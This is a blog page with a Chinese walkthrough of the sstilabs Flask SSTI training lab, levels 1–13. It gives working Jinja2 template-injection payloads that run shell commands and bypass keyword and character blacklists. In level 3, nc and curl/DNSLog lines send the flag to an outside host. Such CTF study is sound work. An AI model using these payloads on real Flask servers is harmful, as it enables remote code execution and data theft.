@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <title>
+        Flask SSTI LAB攻略 |
+        
+        A.M.|P.M.
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"version":"3.0.4"};
+    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="page-container">
+
+    
+
+    <header class="page-header">
+        <div class="header-progress"></div>
+    </header>
+
+    <main class="page-main">
+
+        <div class="page-main-content">
+
+            <div class="page-main-content-top">
+                <header class="header-wrapper">
+
+    <div class="header-content">
+        <a class="logo-title" href="/">
+            A.M.|P.M.
+        </a>
+
+        <ul class="menu-list">
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/"
+                    >
+                        HOME
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/archives"
+                    >
+                        ARCHIVES
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/categories"
+                    >
+                        CATEGORIES
+                    </a>
+                </li>
+            
+        </ul>
+
+        <div class="menu-bar">
+            <div class="menu-bar-middle"></div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+            </div>
+
+            <div class="page-main-content-middle">
+
+                <main class="main-content normal-code-theme">
+
+                    
+                        <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Flask SSTI LAB攻略</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span>John_Frod</span>
+                        <span class="level">Lv4</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-calendar"></i> 2021-05-06 16:01:47
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/categories/CTF/">CTF</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/SSTI/">SSTI</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="Flask-SSTI-LAB攻略"><a href="#Flask-SSTI-LAB攻略" class="headerlink" title="Flask SSTI LAB攻略"></a>Flask SSTI LAB攻略</h1><p>sstilab是一个模板注入的靶场，目前只有Flask模板注入的练习</p>
+<p>地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/X3NNY/sstilabs" >https://github.com/X3NNY/sstilabs<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210427111204793.png" alt="image-20210427111204793"></p>
+<br/>
+
+<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><strong>WAF: no waf</strong></p>
+<p>由于他不是使用GET方法传数据，截包看一下他的数据是怎么传的，方便后续写脚本</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210427113339557.png" alt="image-20210427113339557"></p>
+<p>发现是用POST方法传一个code参数，再利用Burp去找可以利用的类</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210427143654201.png" alt="image-20210427143654201"></p>
+<p>看了几个发现并没有<code>popen()</code>函数，只有一个<code>subprocess.Popen</code>类，利用方式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[258](&#39;cat flag&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>再看看<code>__builtins__</code>类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[196].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后又发现还有<code>os</code>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[258].__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p><strong>WAF: <code>bl[&#39;&#123;&#123;&#39;]</code></strong></p>
+<p>这里过滤了<code>&#123;&#123;</code>，可以使用<code>&#123;% %&#125;</code>来绕过，由于第一关已经知道了能利用的类的下标，这里就不再重复</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#popen</span><br><span class="line">&#123;%print(().__class__.__base__.__subclasses__()[258](&#39;cat flag&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip())%&#125;</span><br><span class="line"></span><br><span class="line">#__builtins__</span><br><span class="line">&#123;%print(().__class__.__base__.__subclasses__()[196].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()&quot;))%&#125;</span><br><span class="line"></span><br><span class="line">#os</span><br><span class="line">&#123;%print(().__class__.__base__.__subclasses__()[258].__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag&#39;).read())%&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p><strong>WAF: no waf and blind</strong></p>
+<p>这一关是盲注，首先我们要知道可以利用的类的名字，比如我们从第一关就知道<code>Popen</code>这个类里面有<code>os</code></p>
+<ul>
+<li>通过<code>nc</code>命令把目录传到自己的服务器上</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;Popen&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag|nc 192.168.91.128 4444&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210427161914594.png" alt="image-20210427161914594"></p>
+<ul>
+<li>使用DNSLog带出数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;Popen&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;os&#39;].popen(&#39;curl http:&#x2F;&#x2F;&#96;cat flag&#96;.t6n089.ceye.io&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210427162855827.png" alt="image-20210427162855827"></p>
+<br/>
+
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p><strong>WAF: bl[‘[‘, ‘]’]</strong></p>
+<p>第四关过滤了中括号，对于索引的<code>[]</code>可以用<code>pop()</code>或<code>__getitem__()</code>代替<code>[]</code>；而类的可以用<code>__getattribute__</code>绕过</p>
+<p>这里还是使用<code>Popen</code>类里面的<code>os</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(258).__init__.__globals__.__getitem__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">#一句话</span><br><span class="line">&#123;% for i in &#39;&#39;.__class__.__mro__.__getitem__(-1).__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;Popen&#39; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p><strong>WAF: bl[‘\‘’, ‘“‘]</strong></p>
+<p>第五关过滤了引号，有两种方法绕过：</p>
+<ul>
+<li>request绕过</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#使用POST方法</span><br><span class="line">&#123;&#123;().__class__.__mro__[-1].__subclasses__()[258].__init__.__globals__[request.values.arg1].popen(request.values.arg2).read()&#125;&#125;</span><br><span class="line">POST:arg1&#x3D;os&amp;arg2&#x3D;cat flag</span><br><span class="line"></span><br><span class="line">#使用Cookie</span><br><span class="line">&#123;&#123;().__class__.__mro__[-1].__subclasses__()[258].__init__.__globals__[request.cookies.arg1].popen(request.cookies.arg2).read()&#125;&#125;</span><br><span class="line">Cookie:arg1&#x3D;os;arg2&#x3D;cat flag</span><br></pre></td></tr></table></figure>
+<ul>
+<li>chr()绕过</li>
+</ul>
+<p>先找出<code>chr()</code>函数的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__mro__[-1].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210427171234903.png" alt="image-20210427171234903"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set chr&#x3D;[].__class__.__mro__[-1].__subclasses__()[58].__init__.__globals__.__builtins__.chr%&#125;</span><br><span class="line">&#123;%print(().__class__.__mro__[-1].__subclasses__()[258].__init__.__globals__[chr(111)%2bchr(115)].popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read())%&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这个似乎没有成功，不知道为啥，还是requset方便，查ascii吐血</p>
+</blockquote>
+<br/>
+
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p><strong>WAF: bl[‘_’]</strong></p>
+<p>第六关过滤了下划线<code>_</code>，可以使用编码或者<code>attr()</code>配合request绕过</p>
+<ul>
+<li>十六位编码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][-1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[258][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;os&quot;].popen(&quot;cat flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Unicode编码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;\u005f\u005fglobals\u005f\u005f&quot;)|attr(&quot;\u005f\u005fgetitem\u005f\u005f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里使用了lipsum这个方法直接调用<code>os</code></p>
+<ul>
+<li>base64编码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;))|attr(&#39;X19iYXNlX18&#x3D;&#39;.decode(&#39;base64&#39;))|attr(&#39;X19zdWJjbGFzc2VzX18&#x3D;&#39;.decode(&#39;base64&#39;))()|attr(&#39;X19nZXRpdGVtX18&#x3D;&#39;.decode(&#39;base64&#39;))(258)|attr(&#39;X19pbml0X18&#x3D;&#39;.decode(&#39;base64&#39;))|attr(&#39;X19nbG9iYWxzX18&#x3D;&#39;.decode(&#39;base64&#39;))|attr(&#39;X19nZXRpdGVtX18&#x3D;&#39;.decode(&#39;base64&#39;))(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;cat flag&#39;)|attr(&#39;read&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>attr()</code>配合request</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)&#125;&#125; </span><br><span class="line">x1&#x3D;__init__;x2&#x3D;__globals__;x3&#x3D;__getitem__;x4&#x3D;__builtins__;x5&#x3D;__import__(&#39;os&#39;).popen(&#39;cat f*&#39;).read()</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p><strong>WAF: bl[‘.’]</strong></p>
+<p>第七关过滤了<code>.</code></p>
+<ul>
+<li><code>[]</code>绕过</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#39;__class__&#39;][&#39;__base__&#39;][&#39;__subclasses__&#39;]()[&#39;__getitem__&#39;](258)[&#39;__init__&#39;][&#39;__globals__&#39;][&#39;__getitem__&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;cat flag&#39;)[&#39;read&#39;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>attr()</code>绕过</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)|attr(&#39;__subclasses__&#39;)()|attr(&#39;__getitem__&#39;)(258)|attr(&#39;__init__&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;cat flag&#39;)|attr(&#39;read&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p><strong>WAF: bl[“class”, “arg”, “form”, “value”, “data”, “request”, “init”, “global”, “open”, “mro”, “base”, “attr”]</strong></p>
+<p>第八关过滤了一堆关键字，使用拼接绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#39;__cl&#39;+&#39;ass__&#39;][&#39;__ba&#39;+&#39;se__&#39;][&#39;__subcl&#39;+&#39;asses__&#39;]()[&#39;__getitem__&#39;](258)[&#39;__in&#39;+&#39;it__&#39;][&#39;__gl&#39;+&#39;obals__&#39;][&#39;__getitem__&#39;](&#39;os&#39;)[&#39;po&#39;+&#39;pen&#39;](&#39;cat flag&#39;)[&#39;read&#39;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p><strong>WAF: bl[‘0-9’]</strong></p>
+<p>第九关过滤了数字</p>
+<ul>
+<li>直接用<code>for</code>循环找到可以利用的类直接利用，</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i in (&#39;&#39;.__class__.__mro__|last()).__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;Popen&#39; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>由于这里的<code>__base__</code>并不是object，因此要用到<code>__mro__[-1]</code>来获取object类，然而又过滤了数字，所以要用<code>last()</code>来获取最后一个类</p>
+</blockquote>
+<ul>
+<li>用<code>lipsum</code>不通过数字直接利用</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>构造数字进行拼接</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set two&#x3D;dict(aa&#x3D;a)|join|count %&#125;</span><br><span class="line">&#123;% set five&#x3D;dict(aaaaa&#x3D;a)|join|count %&#125;</span><br><span class="line">&#123;% set eight&#x3D;dict(aaaaaaaa&#x3D;a)|join|count %&#125;</span><br><span class="line">&#123;% set erwuba&#x3D;(two~five~eight)|int %&#125;</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[erwuba].__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p><strong>WAF: set config = None</strong></p>
+<p>这一关的目标不是flag，而是获取config，可以通过<code>current_app</code>来获取</p>
+<ul>
+<li>url_for</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>get_flashed_messages</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p><strong>WAF: bl[‘&#39;‘, ‘“‘, ‘+’, ‘request’, ‘.’, ‘[‘, ‘]’]</strong></p>
+<p>11关过滤了一堆东西，先确定一个利用的基本payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后再构造变量来绕过，思路为：利用set来定义变量，使用attr()来提取使用变量绕过点,中括号。但是这样存在一个问题是需要获取下划线，这里通过lipsum来获取下划线。</p>
+<p>首先查看<code>_</code>在第几个，这里是下标18为下划线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(lipsum|string|list)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210506114843187.png" alt="image-20210506114843187"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(lipsum|string|list)|attr(pop)(18)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里问题来了，<code>attr()</code>里面要求的是字符串，直接输pop需要用引号<code>&#39;&#39;</code>包围起来，但是这里又过滤了引号，所以要先构造一个<code>pop</code>字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop&#x3D;dict(pop&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set xiahuaxian&#x3D;(lipsum|string|list)|attr(pop)(18)%&#125;</span><br></pre></td></tr></table></figure>
+<p>此时就能成功取到<code>_</code>，再用下划线去构造其他的类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set globals&#x3D;(xiahuaxian,xiahuaxian,dict(globals&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set getitem&#x3D;(xiahuaxian,xiahuaxian,dict(getitem&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br></pre></td></tr></table></figure>
+<p>再去构造后面用到的方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set space&#x3D;(lipsum|string|list)|attr(pop)(9)%&#125;</span><br><span class="line">&#123;% set os&#x3D;dict(os&#x3D;a)|join %&#125;</span><br><span class="line">&#123;% set popen&#x3D;dict(popen&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cat&#x3D;dict(cat&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cmd&#x3D;(cat,space,dict(flag&#x3D;a)|join)|join%&#125;</span><br><span class="line">&#123;% set read&#x3D;dict(read&#x3D;a)|join%&#125;</span><br></pre></td></tr></table></figure>
+<p>最后就是完整的利用语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>合在一起就是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop&#x3D;dict(pop&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set xiahuaxian&#x3D;(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class="line">&#123;% set globals&#x3D;(xiahuaxian,xiahuaxian,dict(globals&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set getitem&#x3D;(xiahuaxian,xiahuaxian,dict(getitem&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set space&#x3D;(lipsum|string|list)|attr(pop)(9)%&#125;</span><br><span class="line">&#123;% set os&#x3D;dict(os&#x3D;a)|join %&#125;</span><br><span class="line">&#123;% set popen&#x3D;dict(popen&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cat&#x3D;dict(cat&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cmd&#x3D;(cat,space,dict(flag&#x3D;a)|join)|join%&#125;</span><br><span class="line">&#123;% set read&#x3D;dict(read&#x3D;a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p><strong>WAF: bl[‘_’, ‘.’, ‘0-9’, ‘\‘, ‘&#39;‘, ‘“‘, ‘[‘, ‘]’]</strong></p>
+<p>这一关把下划线<code>_</code>和数字也过滤了，可以在上一关的基础上加入数字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set nine&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count %&#125;</span><br><span class="line">&#123;% set eighteen&#x3D;nine+nine %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set pop&#x3D;dict(pop&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set xiahuaxian&#x3D;(lipsum|string|list)|attr(pop)(eighteen)%&#125;</span><br><span class="line">&#123;% set globals&#x3D;(xiahuaxian,xiahuaxian,dict(globals&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set getitem&#x3D;(xiahuaxian,xiahuaxian,dict(getitem&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set space&#x3D;(lipsum|string|list)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;% set os&#x3D;dict(os&#x3D;a)|join %&#125;</span><br><span class="line">&#123;% set popen&#x3D;dict(popen&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cat&#x3D;dict(cat&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cmd&#x3D;(cat,space,dict(flag&#x3D;a)|join)|join%&#125;</span><br><span class="line">&#123;% set read&#x3D;dict(read&#x3D;a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p><strong>WAF: bl[‘_’, ‘.’, ‘\‘, ‘&#39;‘, ‘“‘, ‘request’, ‘+’, ‘class’, ‘init’, ‘arg’, ‘config’, ‘app’, ‘self’, ‘[‘, ‘]’]</strong></p>
+<p>过滤的东西更多了，但是我们上面的payload完美避开</p>
